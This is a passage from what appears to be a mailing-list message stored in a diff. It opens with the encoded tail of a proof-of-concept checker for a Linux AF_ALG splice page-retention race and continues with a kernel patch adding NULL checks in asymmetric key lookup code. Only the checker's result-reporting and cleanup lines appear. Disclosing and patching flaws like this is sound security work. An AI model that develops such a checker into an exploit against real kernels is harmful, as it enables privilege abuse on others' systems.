-cyA+IDANCiAgICAgICAgICAgPyAiVlVMTkVSQUJMRSDigJQgc3BsaWNlIHBpcGUgcGFnZSByZXRh
-aW5lZCBpbiBBRl9BTEcgU0dMIg0KICAgICAgICAgICA6ICJObyBUT0NUT1UgaW4gdGhpcyBydW4g
-KG1heSBuZWVkIEtBU0FOIGtlcm5lbCArIHBhZ2VjYWNoZSBwYWdlKSIpOw0KDQogICAgbXVubWFw
-KHBhZ2UsIDQwOTYpOw0KICAgIGNsb3NlKHBpcGVmZFswXSk7IGNsb3NlKHBpcGVmZFsxXSk7IGNs
-b3NlKHRmbSk7DQogICAgcmV0dXJuIChoaXRzID4gMCkgPyAwIDogMTsNCn0NCg==
-
---b1=_YfktIp7CAqY3dotbWLZadBpCS7y7MGd4Y8aoE0g--
+diff --git a/crypto/asymmetric_keys/asymmetric_type.c b/crypto/asymmetric_keys/asymmetric_type.c
+index 16a7ae16593c..22f04656d529 100644
+--- a/crypto/asymmetric_keys/asymmetric_type.c
++++ b/crypto/asymmetric_keys/asymmetric_type.c
+@@ -109,6 +109,8 @@ struct key *find_asymmetric_key(struct key *keyring,
+ 	if (id_0 && id_1) {
+ 		const struct asymmetric_key_ids *kids = asymmetric_key_ids(key);
+ 
++		if (!kids)
++			goto reject;
+ 		if (!kids->id[1]) {
+ 			pr_debug("First ID matches, but second is missing\n");
+ 			goto reject;
+diff --git a/crypto/asymmetric_keys/restrict.c b/crypto/asymmetric_keys/restrict.c
+index 86292965f493..ccf1084f720e 100644
+--- a/crypto/asymmetric_keys/restrict.c
++++ b/crypto/asymmetric_keys/restrict.c
+@@ -243,10 +243,14 @@ static int key_or_keyring_common(struct key *dest_keyring,
+ 			if (IS_ERR(key))
+ 				key = NULL;
+ 		} else if (trusted->type == &key_type_asymmetric) {
++			const struct asymmetric_key_ids *kids;
+ 			const struct asymmetric_key_id **signer_ids;
+ 
+-			signer_ids = (const struct asymmetric_key_id **)
+-				asymmetric_key_ids(trusted)->id;
++			kids = asymmetric_key_ids(trusted);
++			if (!kids)
++				goto skip_trusted;
++
++			signer_ids = (const struct asymmetric_key_id **)kids->id;
+ 
+ 			/*
+ 			 * The auth_ids come from the candidate key (the
+@@ -290,6 +294,7 @@ static int key_or_keyring_common(struct key *dest_keyring,
+ 		}
+ 	}
+ 
++skip_trusted:
+ 	if (check_dest && !key) {
+ 		/* See if the destination has a key that signed this one. */
+ 		key = find_asymmetric_key(dest_keyring, sig->auth_ids[0],
+-- 
+2.43.0
 
